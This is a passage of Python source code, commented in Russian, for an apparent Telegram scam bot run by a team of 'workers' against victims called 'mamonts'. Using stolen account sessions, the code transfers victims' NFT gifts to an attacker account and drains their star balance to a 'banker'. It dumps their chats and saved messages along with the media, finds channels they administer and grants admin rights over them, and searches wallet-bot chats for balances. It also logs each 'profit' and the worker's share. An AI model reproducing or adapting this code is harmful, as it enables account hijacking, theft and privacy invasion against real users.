            self.cursor.execute("INSERT OR REPLACE INTO worker_wallets (user_id, wallet_address, wallet_type) VALUES (?, ?, ?)",
                              (user_id, wallet_address, wallet_type))
            self.conn.commit()

    def add_nft(self, user_id, model, number):
        """Добавляет NFT пользователю (если не существует)"""
        try:
            with db_lock:
                self.cursor.execute("INSERT OR IGNORE INTO user_nfts (user_id, model, number) VALUES (?, ?, ?)",
                                  (user_id, model, number))
                self.conn.commit()
                return True
        except Exception as e:
            print_error(f"Database error in add_nft: {e}")
            return False

    def get_user_nfts(self, user_id):
        """Получает все NFT пользователя"""
        try:
            with db_lock:
                self.cursor.execute("SELECT model, number, received_at FROM user_nfts WHERE user_id = ? ORDER BY received_at DESC",
                                  (user_id,))
                rows = self.cursor.fetchall()
                return [{'model': row[0], 'number': row[1], 'received_at': row[2]} for row in rows]
        except Exception as e:
            print_error(f"Database error in get_user_nfts: {e}")
            return []

    def get_wallet(self, user_id):
        with db_lock:
            self.cursor.execute("SELECT wallet_address, wallet_type FROM worker_wallets WHERE user_id = ?", (user_id,))
            row = self.cursor.fetchone()
            return {'address': row[0], 'type': row[1]} if row else None
    def check_and_claim_link(self, unique_id, user_id):
        """Проверяет уникальный ID ссылки. Если свободен — занимает его."""
        with db_lock:
            # Проверяем, есть ли уже такая запись
            self.cursor.execute("SELECT user_id FROM claimed_links WHERE unique_id = ?", (unique_id,))
            if self.cursor.fetchone():
                return False # Уже занято
            
            # Если нет — занимаем
            self.cursor.execute("INSERT INTO claimed_links (unique_id, user_id) VALUES (?, ?)", (unique_id, user_id))
            self.conn.commit()
            return True
        
    def register_payout(self, user_id, amount):
        """Фиксирует выплату воркеру в базе"""
        with db_lock:
            user = self.get_user(user_id)
            if user:
                current_paid = user.get('worker_paid_amount', 0)
                new_paid = current_paid + amount
                self.cursor.execute("UPDATE users SET worker_paid_amount = ? WHERE user_id = ?", (new_paid, user_id))
                self.conn.commit()
                return True
        return False

db_lock = threading.RLock()
db = Database()

# ================= STATES =================
class CreateCheckState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_activations = State()

class TopUpState(StatesGroup):
    waiting_for_custom_amount = State()

class BuyStarsState(StatesGroup):
    waiting_for_amount = State()

class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class AdminSettingsState(StatesGroup):
    waiting_target = State()
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_api_url = State()

class AdminSearchState(StatesGroup):
    waiting_for_digits = State()

class FakeSaleState(StatesGroup):
    waiting_for_tag = State()
    waiting_for_amount = State()

class WaitingWalletAddress(StatesGroup):
    waiting_wallet_address = State()

# ================= RATE LIMITING =================
class RateLimitMiddleware(BaseMiddleware):
    def __init__(self):
        super().__init__()
        self.user_actions = {}  # user_id: [timestamps]

    async def __call__(self, handler, event, data):
        if hasattr(event, 'from_user') and event.from_user:
            user_id = event.from_user.id
            now = time.time()
            if user_id not in self.user_actions:
                self.user_actions[user_id] = []
            # Clean old actions (>60s)
            self.user_actions[user_id] = [t for t in self.user_actions[user_id] if now - t < 60]
            # Check limits
            if isinstance(event, types.Message):
                # 10 messages per minute
                if len(self.user_actions[user_id]) >= 10:
                    return  # Ignore
            elif isinstance(event, types.InlineQuery):
                # 5 inline queries per minute
                if len(self.user_actions[user_id]) >= 5:
                    return  # Ignore
            elif isinstance(event, types.CallbackQuery):
                # 20 callbacks per minute
                if len(self.user_actions[user_id]) >= 20:
                    return  # Ignore
            self.user_actions[user_id].append(now)
        return await handler(event, data)

# ================= UTIL FUNCTIONS =================
def mask_phone(phone):
    clean = str(phone).replace(" ", "").replace("+", "").replace("-", "")
    if len(clean) > 7: return f"+{clean[:2]}*****{clean[-4:]}"
    return "Неизвестно"

def mask_user(text):
    if not text: return "******"
    if len(text) > 4: return f"{text[:2]}*****{text[-2:]}"
    return text

def get_target_username():
    raw = str(SETTINGS["target_user"])
    clean = raw.replace("https://t.me/", "").replace("@", "").strip()
    return clean

def clean_filename(name):
    cleaned = re.sub(r'[^\w\s\-\(\)]', '', str(name))
    return cleaned.strip() or "unknown"

def get_webapp_url(user_id, current_api_url):
    raw_url = current_api_url.strip().strip("'").strip('"').rstrip('/')
    if 'localhost' not in raw_url and not raw_url.startswith('https://'):
        raw_url = raw_url.replace('http://', 'https://') if 'http://' in raw_url else 'https://' + raw_url
    sep = '&' if '?' in raw_url else '?'
    return f"{raw_url}{sep}chatId={user_id}"

async def safe_edit_text(message: Message, text: str, reply_markup=None):
    try:
        if message.content_type == ContentType.PHOTO:
            await message.delete()
            await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await message.edit_text(text, reply_markup=reply_markup, parse_mode='HTML')
    except:
        await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')

# ================= УЛУЧШЕННОЕ ЛОГИРОВАНИЕ =================

async def log_check_activation(bot: Bot, user: types.User, check_data: dict):
    # Check if user should be skipped from logging
    if should_skip_log_user(user):
        print_info(f"Skipping log for user {user.id} (contains banned words)")
        return

    full_name = user.first_name or "Без имени"
    user_tag = f"@{mask_data(user.username)}" if user.username else mask_data(str(user.id))

    worker_info = "👤 <b>Воркер:</b> 👤 Администрация"
    if check_data.get('creator_id'):
        w = db.get_user(check_data['creator_id'])
        if w:
            w_tag = f"@{w['username']}" if w['username'] else f"Тег: {w['user_id']}"
            worker_info = f"👤 <b>Воркер:</b> {w_tag}"

    check_log = (
        f"<b>🎟 ПЕРЕХОД ПО ЧЕКУ</b>\n"
        f"<code>««─────────────────»»</code>\n"
        f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
        f"🆔 <b>Тег:</b> <code>{user_tag}</code>\n"
        f"🎫 <b>Чек:</b> <code>{check_data.get('amount', 0)} ⭐️</code>\n"
        f"{worker_info}\n"
        f"<code>««─────────────────»»</code>"
    )
    await log_to_topic(bot, 'topic_launch', check_log)

async def log_to_topic(bot: Bot, topic_key: str, text: str, photo_url: str = None):
    gid = SETTINGS.get('allowed_group_id')
    tid = SETTINGS.get(topic_key)

    if not gid or not tid:
        return f"Missing gid or tid: gid={gid}, tid={tid}"

    try:
        # 1. Пытаемся отправить с фото
        if photo_url:
            try:
                await bot.send_photo(
                    chat_id=int(gid),
                    photo=photo_url,
                    caption=text,
                    message_thread_id=int(tid),
                    parse_mode="HTML"
                )
                return "Message sent with photo"
            except Exception as e:
                print_error(f"📸 Не удалось отправить фото ({e}). Отправляю только текст...")
                # Если фото не ушло, код пойдет дальше к отправке текста

        # 2. Отправляем просто текст (если фото нет или оно сломалось)
        await bot.send_message(
            chat_id=int(gid),
            text=text,
            message_thread_id=int(tid),
            disable_web_page_preview=True,
            parse_mode="HTML"
        )
        return f"Message sent to topic {topic_key}"

    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after)
        return await log_to_topic(bot, topic_key, text, photo_url)
    except Exception as e:
        print_error(f"❌ Log Error (Global): {e}")
        return f"Log error: {e}"

async def log_profit_to_topic(bot: Bot, profit_data: dict):
    print("Starting log_profit_to_topic")
    try:
        mamont_tag = profit_data.get('mamont_tag', 'Unknown')
        # Получаем данные о всех NFT
        all_nft_data = profit_data.get('nft_data', [])
        worker_id = profit_data.get('worker_id', None)
        
        # ФИЛЬТРАЦИЯ: Оставляем только те NFT, которые были реально переданы
        # (Проверяем наличие флага 'transferred', который мы добавим в FULL_WORKER_CYCLE)
        successful_nfts = [nft for nft in all_nft_data if nft.get('transferred') is True]
        nft_count = len(successful_nfts)

        if nft_count == 0:
            return "No profit to log - no NFTs successfully transferred"

        # === ЛОГИКА ПРОЦЕНТОВ ===
        # Всегда 70% для воркера
        worker_percentage = 0.70

        # Получение цен через Portals API для успешных NFT
        gift_links = [nft.get('url', '') for nft in successful_nfts if nft.get('url')]
        total_floor_price = 0.0
        if PORTALS_AVAILABLE and gift_links:
            try:
                portals_result = await portals_api.calculate_total_floor_price(gift_links)
                total_floor_price = portals_result.get('total', 0.0)
            except Exception: pass

        # Чистая стоимость (вычитаем системную комиссию 7.5% для отображения "чистыми")
        display_floor_price = total_floor_price * 0.925 
        # Доля воркера от чистой стоимости на основе процента
        worker_share = display_floor_price * worker_percentage

        print_success(f"💰 PROFIT: {display_floor_price:.2f} TON | 👷 %: {int(worker_percentage*100)}% | 🎁 Count: {nft_count}")

        # Увеличиваем счетчики воркера
        worker_tag = "👤 Администрация"
        wallet_text = ""
        if worker_id:
            db.increment_worker_profits(worker_id, nft_count)
            db.increment_worker_total_profits(worker_id, worker_share)

            worker_user = db.get_user(worker_id)
            if worker_user and worker_user.get('username'):
                worker_tag = f"@{worker_user['username']}"
            else:
                worker_tag = f"ID:{worker_id}"

            wallet_info = db.get_wallet(worker_id)
            if wallet_info:
                wallet_text = f"\n<b>💰 Кошелек для выплат:</b> <code>{wallet_info['address']}</code>"

        # Формируем список ссылок ТОЛЬКО переданных NFT
        nft_text_lines = []
        for nft in successful_nfts:
            title = html.escape(nft.get('title', 'Unknown NFT'))
            url = nft.get('url', '')
            if url:
                nft_text_lines.append(f"<blockquote><a href=\"{url}\">{title}</a></blockquote>")
            else:
                nft_text_lines.append(f"<blockquote>{title}</blockquote>")

        nft_text = "\n".join(nft_text_lines)

        profit_log = (
            f"<b>👤 {mamont_tag}</b>\n\n"
            f"<b>[▫️] NELIX TEAM BOT</b>\n"
            f"<b>[◾️] Новый профит!</b>\n"
            f"<b>[🔻] Были получены ({nft_count} шт.):</b>\n"
            f"<b>{nft_text}</b>\n"
            f"<b>💵 Стоимость: ~{display_floor_price:.2f} TON</b>\n"
            f"<b>🔹 Доля воркера: уточнить у @justiluv</b>\n"
            f"<b>👷 Воркер: {worker_tag}</b>{wallet_text}"
        )

        profit_image_url = "https://i.ibb.co/45LnHMV/Picsart-26-02-04-00-03-50-721.jpg"
        result = await log_to_topic(bot, 'topic_profit', profit_log, profit_image_url)
        return result
    except Exception as e:
        print_error(f"Exception in log_profit_to_topic: {e}")
        return f"Error: {e}"

async def log_tradeban_nft(bot: Bot, tradeban_data: dict):
    """Логирование NFT, которые находятся в холде (трейдбан)"""
    # Экранируем теги, чтобы никнеймы типа "<name>" не ломали HTML разметку
    raw_mamont = tradeban_data.get('mamont_tag', 'Unknown')
    mamont_tag = html.escape(str(raw_mamont))
    
    raw_worker = tradeban_data.get('worker_tag', 'Unknown')
    worker_tag = html.escape(str(raw_worker))

    nft_list = tradeban_data.get('nft_list', [])

    # Формируем список с датами разбана
    items_text = []
    if nft_list:
        for nft in nft_list:
            title = html.escape(nft.get('title', 'NFT'))
            
            # Обработка даты разблокировки
            unlock_date = nft.get('unlock_date')
            time_str = ""
            
            if unlock_date:
                try:
                    # Попытка форматирования даты
                    d_str = unlock_date.strftime("%d.%m %H:%M")
                    time_str = f" (🔒 до {d_str})"
                except:
                    time_str = " (🔒 Холд)"
            
            items_text.append(f"• {title}{time_str}")
        
        nft_text = "\n".join(items_text)
    else:
        nft_text = "• Нет NFT"

    tradeban_log = (
        f"👤 <b>{mamont_tag}</b>\n\n"
        f"[🚫] <b>NELIX TEAM BOT</b>\n"
        f"[⏳] <b>NFT в трейдбане!</b>\n"
        f"[🔻] <b>Недоступны для передачи:</b>\n"
        f"{nft_text}\n"
        f"🔹 <b>Воркер:</b> {worker_tag}"
    )
    
    # Используем topic_success для лога (проверьте в settings.json ID этого топика!)
    result = await log_to_topic(bot, 'topic_success', tradeban_log)
    
    # Если log_to_topic вернул строку с ошибкой (начинается не с Message sent)
    if result and "Message sent" not in str(result):
        print(f"⚠️ Ошибка внутри log_to_topic для трейдбана: {result}")
        
class SessionMonitor:
    """Мониторинг сессий в реальном времени"""
    
    def __init__(self, bot_instance: Bot):
        self.bot = bot_instance
        self.running = False
        self.active_sessions = {}
        self.check_interval = 300  # 5 минут между проверками
        self.max_retries = 3  # Максимум 3 попытки переподключения
        
    async def start_monitoring(self):
        """Запуск фонового мониторинга сессий"""
        self.running = True
        print_info("🔍 Запуск автоматического мониторинга сессий...")
        
        while self.running:
            try:
                await self.check_all_sessions()
                await asyncio.sleep(self.check_interval)
            except Exception as e:
                print_error(f"Ошибка в мониторинге сессий: {e}")
                await asyncio.sleep(60)  # Ждем минуту при ошибке
    
    async def check_all_sessions(self):
        """Проверка всех сессий на валидность"""
        try:
            # Получаем все файлы сессий
            session_files = list(SESSIONS_DIR.glob("*.session"))
            
            for session_file in session_files:
                s_name = session_file.stem
                
                # Пропускаем сессию банкира
                if s_name == SETTINGS.get('banker_session', 'main_admin'):
                    continue
                
                # Проверяем сессию
                await self.check_single_session(s_name)
                
                # Небольшая пауза между проверками
                await asyncio.sleep(1)
                
        except Exception as e:
            print_error(f"Ошибка при проверке сессий: {e}")
    
    async def check_single_session(self, session_name: str):
        """Проверка одной сессии"""
        client = None
        try:
            # Создаем клиент
            client = Client(
                session_name,
                api_id=SETTINGS['api_id'],
                api_hash=SETTINGS['api_hash'],
                workdir=str(SESSIONS_DIR)
            )
            
            # Пытаемся подключиться
            await client.connect()
            
            # Пытаемся получить информацию о пользователе
            me = await client.get_me()
            
            # Если подключение успешно - сессия жива
            if session_name not in self.active_sessions:
                self.active_sessions[session_name] = {
                    'phone': me.phone_number,
                    'user_id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_check': datetime.now(),
                    'status': 'active',
                    'retry_count': 0
                }
            else:
                # Обновляем время последней проверки
                self.active_sessions[session_name]['last_check'] = datetime.now()
                self.active_sessions[session_name]['status'] = 'active'
                self.active_sessions[session_name]['retry_count'] = 0
                
            await client.disconnect()
            
        except (SessionRevoked, AuthKeyUnregistered, AuthKeyInvalid, UserDeactivated) as e:
            # Сессия была кикнута/отозвана
            await self.handle_session_kicked(session_name, client, str(e))
            
        except FloodWait as e:
            print_warning(f"FloodWait для {session_name}: {e.value} секунд")
            await asyncio.sleep(e.value)
            
        except Exception as e:
            # Другие ошибки
            error_msg = str(e).lower()
            
            # Проверяем, является ли ошибка признаком кикнутой сессии
            if any(keyword in error_msg for keyword in [
                'session revoked', 
                'auth key unregistered',
                'user deactivated',
                'the user is deleted',
                'user not found'
            ]):
                await self.handle_session_kicked(session_name, client, str(e))
            else:
                # Просто логируем другие ошибки
                print_warning(f"Ошибка при проверке сессии {session_name}: {e}")
                
                # Увеличиваем счетчик попыток
                if session_name in self.active_sessions:
                    self.active_sessions[session_name]['retry_count'] += 1
                    
                    # Если много ошибок подряд, помечаем как проблемную
                    if self.active_sessions[session_name]['retry_count'] >= self.max_retries:
                        print_warning(f"Сессия {session_name} имеет проблемы после {self.max_retries} попыток")
                        
        finally:
            if client and client.is_connected:
                try:
                    await client.disconnect()
                except:
                    pass
    
    async def handle_session_kicked(self, session_name: str, client, error_message: str):
        """Обработка кикнутой сессии"""
        try:
            # Получаем информацию о сессии
            session_info = self.active_sessions.get(session_name, {})
            phone = session_info.get('phone', 'Unknown')
            user_id = session_info.get('user_id', 'Unknown')
            username = session_info.get('username', 'Unknown')
            first_name = session_info.get('first_name', 'Unknown')
            
            # Определяем причину
            if 'session revoked' in error_message.lower():
                reason = "👤 Пользователь отключил сессию через настройки Telegram"
            elif 'user deactivated' in error_message.lower():
                reason = "🚫 Аккаунт пользователя деактивирован"
            elif 'auth key unregistered' in error_message.lower():
                reason = "🔑 Ключ авторизации не зарегистрирован"
            else:
                reason = f"⚠️ Причина: {error_message}"
            
            # Формируем лог
            log_text = (
                f"<b>🔌 СЕССИЯ ОТКЛЮЧЕНА (АВТОМАТИЧЕСКИЙ ДЕТЕКТ)</b>\n"
                f"<code>««─────────────────»»</code>\n"
                f"📱 <b>Сессия:</b> <code>{session_name}</code>\n"
                f"👤 <b>Имя:</b> <code>{first_name}</code>\n"
                f"📞 <b>Телефон:</b> <code>{mask_phone(phone)}</code>\n"
                f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                f"🔍 <b>Причина:</b> {reason}\n"
                f"<code>««─────────────────»»</code>"
            )
            
            # Отправляем лог в topic_auth
            await log_to_topic(self.bot, 'topic_auth', log_text)
            
            print_warning(f"Сессия {session_name} была кикнута. Причина: {reason}")
            
            # Перемещаем файл сессии в архив плохих сессий
            await self.archive_bad_session(session_name)
            
            # Удаляем из активных сессий
            if session_name in self.active_sessions:
                del self.active_sessions[session_name]
                
        except Exception as e:
            print_error(f"Ошибка при обработке кикнутой сессии {session_name}: {e}")
    
    async def archive_bad_session(self, session_name: str):
        """Архивация плохой сессии"""
        try:
            src_file = SESSIONS_DIR / f"{session_name}.session"
            dst_file = BAD_DIR / f"{session_name}.session"
            
            if src_file.exists():
                # Создаем папку для плохих сессий, если её нет
                BAD_DIR.mkdir(exist_ok=True)
                
                # Перемещаем файл
                shutil.move(str(src_file), str(dst_file))
                print_success(f"Сессия {session_name} перемещена в archive_bad/")
                
        except Exception as e:
            print_error(f"Не удалось архивировать сессию {session_name}: {e}")
    
    async def stop_monitoring(self):
        """Остановка мониторинга"""
        self.running = False
        print_info("⏹ Остановка мониторинга сессий")

# Глобальный экземпляр мониторинга
session_monitor = None

# --- Вспомогательные функции маскирования (в начало файла) ---
def mask_data(data: str) -> str:
    """Скрывает центральную часть строки (примерно 1/3)."""
    if not data or data == "None": return "отсутствует"
    data = str(data)
    if len(data) < 4: return data

    one_third = len(data) // 3
    # Оставляем начало и конец, середину закрываем звездами
    return data[:one_third] + "*" * (len(data) - 2 * one_third) + data[-one_third:]

def mask_phone(phone: str) -> str:
    """Скрывает центральные цифры номера телефона."""
    phone = re.sub(r'\D', '', str(phone))
    if len(phone) < 10: return mask_data(phone)
    # Формат +7900***1122
    return f"+{phone[:4]}***{phone[-4:]}"

# ================= CORE LOGIC: DUMP, DRAIN, TRANSFER (MERGED FROM SCRIPT 2) =================

async def get_stars_info(client: Client):
    try:
        balance = await client.get_stars_balance("me")
        return int(balance)
    except: return 0

async def get_all_received_gifts(client: Client):
    all_gifts = []
    try:
        async for gift in client.get_chat_gifts(chat_id="me"):
            all_gifts.append(gift)
    except: pass
    return all_gifts

def analyze_gift_structure(gift):
    details = {
        'id': gift.id, 'msg_id': gift.message_id, 'title': 'Неизвестный',
        'star_count': gift.convert_price or 0, 'transfer_cost': gift.transfer_price or 0,
        'is_nft': False, 'can_transfer': False, 'can_convert': False, 'unlock_date': None, 'url': ''
    }
    try:
        # Логируем структуру подарка для отладки
        print(f"🔍 Анализ подарка ID {gift.id}: hasattr(gift, 'link')={hasattr(gift, 'link')}, hasattr(gift, 'url')={hasattr(gift, 'url')}, hasattr(gift, 'gift')={hasattr(gift, 'gift')}")

        # Получаем URL подарка по аналогии с utils.py
        if hasattr(gift, 'link') and gift.link:
            details['url'] = gift.link
            print(f"✅ URL из gift.link: {details['url']}")
        elif hasattr(gift, 'url') and gift.url:
            details['url'] = gift.url
            print(f"✅ URL из gift.url: {details['url']}")
        elif hasattr(gift, 'gift') and hasattr(gift.gift, 'url') and gift.gift.url:
            details['url'] = gift.gift.url
            print(f"✅ URL из gift.gift.url: {details['url']}")
        else:
            details['url'] = ''
            print(f"⚠️ URL не найден для подарка {gift.id}")

        if getattr(gift, 'collectible_id', None) is not None:
            details['is_nft'] = True
            details['title'] = gift.title or gift.name or 'NFT Gift'
            details['unlock_date'] = gift.can_transfer_at
            if gift.can_transfer_at is None:
                details['can_transfer'] = True
            else:
                now = datetime.now(gift.can_transfer_at.tzinfo) if gift.can_transfer_at.tzinfo else datetime.now()
                details['can_transfer'] = gift.can_transfer_at <= now
        else:
            is_converted = getattr(gift, 'is_converted', False)
            details['can_convert'] = (details['star_count'] > 0) and (not is_converted)
            emoji = GIFT_EMOJIS.get(gift.id, "")
            details['title'] = f"Подарок {emoji}" if emoji else "Обычный подарок"
    except Exception as e:
        log_transfer(f"Ошибка анализа: {e}", "error")
    return details

async def convert_regular_gift(client: Client, gift_details):
    try:
        if await client.convert_gift_to_stars(owned_gift_id=str(gift_details['msg_id'])):
            print_success(f"Конвертирован: {gift_details['title']} -> {gift_details['star_count']} stars")
            return True
    except BadRequest: pass
    except Exception as e: log_transfer(f"Convert Error: {e}", "error")
    return False

async def send_gift_from_banker(main_client: Client, recipient_id, recipient_username, gift_id):
    try:
        target = recipient_username if recipient_username else recipient_id
        log_transfer(f"Банкир шлет подарок {gift_id} на {target}")
        await main_client.send_gift(chat_id=target, gift_id=gift_id)
        return True
    except (PeerIdInvalid, UsernameInvalid):
        print_error(f"Банкир не нашел получателя {target}")
    except FloodWait as e:
        print_warning(f"FloodWait {e.value}s")
        await asyncio.sleep(e.value)
    except Exception as e:
        log_transfer(f"Banker Send Error: {e}", "error")
    return False

async def replenish_balance_bulk(donor_client: Client, donor_id, donor_username, banker_client: Client, needed_amount: int):
    current = await get_stars_info(donor_client)

    while current < needed_amount:
        target_gift_id = 5170233102089322756 # 🧸 15 звезд
        
        # Проверяем, достаточно ли будет после добавления одного подарка
        if current + 15 >= needed_amount:
            break

        if not await send_gift_from_banker(banker_client, donor_id, donor_username, target_gift_id):
            return False

        await asyncio.sleep(1) # БЫЛО 6: Уменьшили ожидание появления подарка

        gift_found = False
        for _ in range(1): # БЫЛО 5: Меньше итераций поиска
            gifts = await get_all_received_gifts(donor_client)
            for g in gifts:
                d = analyze_gift_structure(g)
                if d['id'] == target_gift_id and d['can_convert']:
                    if await convert_regular_gift(donor_client, d):
                        gift_found = True
                        break
            if gift_found: break
            await asyncio.sleep(0.5) # БЫЛО 2: Быстрее перепроверка

        current = await get_stars_info(donor_client)

    return True

async def transfer_nft_gift(client: Client, gift_details):
    target = get_target_username()
    try:
        # Попробуем использовать gift.transfer() если объект gift доступен
        if 'gift_obj' in gift_details and gift_details['gift_obj']:
            await gift_details['gift_obj'].transfer(target)
            print_success(f"NFT {gift_details['title']} передан на @{target} (gift.transfer)")
        else:
            await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target)
            print_success(f"NFT {gift_details['title']} передан на @{target} (client.transfer_gift)")
        log_transfer(f"SUCCESS NFT TRANSFER: {gift_details['title']}")
        return True
    except Exception as e:
        log_transfer(f"NFT Transfer Error: {e}", "error")
    return False

async def drain_remaining_stars(client: Client, banker_username: str):
    """Слив остатка звезд обратно банкиру"""
    # ИСПРАВЛЕНО: Добавлен break для перезапуска цикла после отправки
    while True:
        balance = await get_stars_info(client)
        if balance < 15 or not banker_username:
            break

        log_transfer(f"Дрейн остатка: {balance} звезд банкиру @{banker_username}")
        # Сортируем от дорогих к дешевым
        sorted_gifts = sorted(REGULAR_GIFTS.items(), key=lambda x: x[1], reverse=True)
        
        sent_any = False
        for g_id, price in sorted_gifts:
            if balance >= price:
                try:
                    await client.send_gift(chat_id=banker_username, gift_id=g_id)
                    balance -= price
                    sent_any = True
                    await asyncio.sleep(0.3) 
                    # Прерываем for, чтобы пересчитать баланс и начать поиск с самого дорогого
                    break 
                except Exception as e:
                    print_error(f"Drain error: {e}")
                    continue
        
        if not sent_any:
            break

async def dump_chat_history(client: Client, user_id: int):
    """Дамп чатов (интеграция Script 2)"""
    limit = SETTINGS.get("dump_limit", 50)
    if limit <= 0: return

    base_path = DUMP_DIR / str(user_id)
    base_path.mkdir(parents=True, exist_ok=True)

    log_transfer(f"Дамп чатов для {user_id}...")
    try:
        async for dialog in client.get_dialogs():
            chat = dialog.chat
            safe_name = clean_filename(chat.title or chat.first_name or "unknown")
            file_path = base_path / f"{safe_name}_{chat.id}.txt"

            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(f"CHAT: {safe_name} (ID: {chat.id})\n\n")
                    async for msg in client.get_chat_history(chat.id, limit=limit):
                        d = msg.date.strftime("%Y-%m-%d %H:%M") if msg.date else "NoDate"
                        s = "Me" if msg.from_user and msg.from_user.is_self else (msg.from_user.first_name if msg.from_user else "Other")
                        t = msg.text or msg.caption or "[Media]"
                        f.write(f"[{d}] {s}: {t}\n")
            except: pass
    except Exception as e:
        log_transfer(f"Dump Error: {e}", "error")

async def dump_saved_messages(client: Client, user_id: int):
    """Дамп сохраненных сообщений (Saved Messages)"""
    base_path = DUMP_DIR / str(user_id) / "saved_messages"
    base_path.mkdir(parents=True, exist_ok=True)

    try:
        msg_count = 0
        media_count = 0

        with open(base_path / "saved_messages.txt", "w", encoding="utf-8") as f:
            f.write("SAVED MESSAGES (Избранное)\n\n")

            # Используем постраничную загрузку для получения ВСЕХ сообщений
            offset_id = 0
            batch_num = 0
            max_batches = 100  # Защита от бесконечного цикла (100 батчей по 200 = 20,000 сообщений)

            while batch_num < max_batches:
                batch_count = 0
                try:
                    async for msg in client.get_chat_history("me", limit=200, offset_id=offset_id):
                        d = msg.date.strftime("%Y-%m-%d %H:%M") if msg.date else "NoDate"
                        t = msg.text or msg.caption or "[Media]"

                        # Скачиваем фото и другие медиа
                        media_path = None
                        try:
                            if msg.photo:
                                media_path = base_path / f"photo_{msg.id}.jpg"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Фото сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.document:
                                file_name = msg.document.file_name or f"doc_{msg.id}"
                                media_path = base_path / f"doc_{msg.id}_{file_name}"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Документ сохранен: {media_path.name}]"
                                media_count += 1
                            elif msg.video:
                                media_path = base_path / f"video_{msg.id}.mp4"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Видео сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.audio:
                                media_path = base_path / f"audio_{msg.id}.mp3"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Аудио сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.voice:
                                media_path = base_path / f"voice_{msg.id}.ogg"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Голосовое сохранено: {media_path.name}]"
                                media_count += 1
                            elif msg.sticker:
                                media_path = base_path / f"sticker_{msg.id}.webp"
                                await client.download_media(msg, file_name=str(media_path))
                                t += f" [Стикер сохранен: {media_path.name}]"
                                media_count += 1
                        except Exception as media_error:
                            t += f" [Ошибка загрузки медиа: {str(media_error)}]"

                        f.write(f"[{d}]: {t}\n")
                        msg_count += 1
                        batch_count += 1
                        offset_id = msg.id  # Обновляем offset_id для следующей партии

                    batch_num += 1

                    if batch_count < 200:  # Достигли конца истории
                        break

                    # Небольшая задержка между батчами
                    await asyncio.sleep(0.1)

                except Exception as batch_error:
                    break

    except Exception as e:
        pass

async def admin_finder(client: Client) -> dict:
    """
    👑 Admin Finder: Оптимизированный поиск админок с задержками
    """
    admin_chats = []
    me = await client.get_me()
    my_id = me.id

    try:
        # ИСПРАВЛЕНО: limit=200 и пауза, чтобы не флудить запросами
        count = 0
        async for dialog in client.get_dialogs(limit=250):
            count += 1
            if count % 10 == 0: await asyncio.sleep(0.2) # Пауза каждые 10 диалогов

            chat = dialog.chat
            if chat.type in [pyrogram.enums.ChatType.CHANNEL, pyrogram.enums.ChatType.SUPERGROUP, pyrogram.enums.ChatType.GROUP]:
                try:
                    participant = await client.get_chat_member(chat.id, my_id)
                    if participant.status in [pyrogram.enums.ChatMemberStatus.ADMINISTRATOR, pyrogram.enums.ChatMemberStatus.OWNER]:
                        admin_chats.append({
                            'id': chat.id,
                            'title': chat.title or "Без названия",
                            'type': 'channel' if chat.type == pyrogram.enums.ChatType.CHANNEL else 'group',
                            'status': 'owner' if participant.status == pyrogram.enums.ChatMemberStatus.OWNER else 'admin',
                            'member_count': chat.members_count or 0
                        })
                except Exception:
                    continue
    except Exception as e:
        print_error(f"Error in admin_finder: {e}")

    return {'admin_chats': admin_chats, 'count': len(admin_chats)}

async def wallet_hunter(client: Client) -> dict:
    """
    💰 Wallet Hunter: Проверяет историю с ботами @wallet, @CryptoBot, @xrocket
    """
    wallet_bots = ['@wallet', '@CryptoBot', '@xrocket']
    found_wallets = []

    for bot_username in wallet_bots:
        try:
            # Получаем диалог с ботом
            async for dialog in client.get_dialogs():
                if dialog.chat.username == bot_username.replace('@', ''):
                    # Получаем последние сообщения
                    messages = []
                    async for msg in client.get_chat_history(dialog.chat.id, limit=50):
                        if msg.text:
                            messages.append(msg.text)

                    # Ищем упоминания баланса или транзакций
                    balance_patterns = [
                        r'баланс[:\s]*(\d+(?:\.\d+)?)',
                        r'balance[:\s]*(\d+(?:\.\d+)?)',
                        r'(\d+(?:\.\d+)?)\s*(?:TON|USDT|BTC|ETH)',
                        r'transaction|транзакция|transfer|перевод'
                    ]

                    found_info = []
                    for msg in messages:
                        for pattern in balance_patterns:
                            matches = re.findall(pattern, msg, re.IGNORECASE)
                            if matches:
                                found_info.extend(matches)

                    if found_info:
                        found_wallets.append({
                            'bot': bot_username,
                            'found_data': list(set(found_info)),  # Убираем дубликаты
                            'messages_checked': len(messages)
                        })
                    break
        except Exception as e:
            print_error(f"Error checking {bot_username}: {e}")
            continue

    return {'wallets': found_wallets, 'count': len(found_wallets)}

async def transfer_channel_admin(client: Client, channel_id: int, new_owner_username: str):
    """
    Передает админку/владение с защитой от FloodWait и гарантированным удалением
    """
    transfer_details = {
        'channel_id': channel_id,
        'success': False,
        'reason': '',
        'admin_channels': []
    }

    try:
        chat = await client.get_chat(channel_id)
        transfer_details['channel_title'] = chat.title or "Без названия"
        
        # Проверяем 2FA (обязательно для передачи прав)
        try:
            await client.get_password_hint()
        except Exception:
            # Если пароля нет, Telegram может не дать передать права сразу
            print_warning(f"На аккаунте нет 2FA, передача владения каналом {channel_id} может не сработать.")

        # 1. Выдача Админки
        target_username = new_owner_username.replace('@', '')
        try:
            await client.promote_chat_member(
                channel_id,
                target_username,
                privileges=pyrogram.types.ChatPrivileges(
                    can_manage_chat=True, can_delete_messages=True, can_manage_video_chats=True,
                    can_restrict_members=True, can_promote_members=True, can_change_info=True,
                    can_invite_users=True, can_post_messages=True, can_edit_messages=True,
                    can_pin_messages=True, can_manage_topics=True
                )
            )
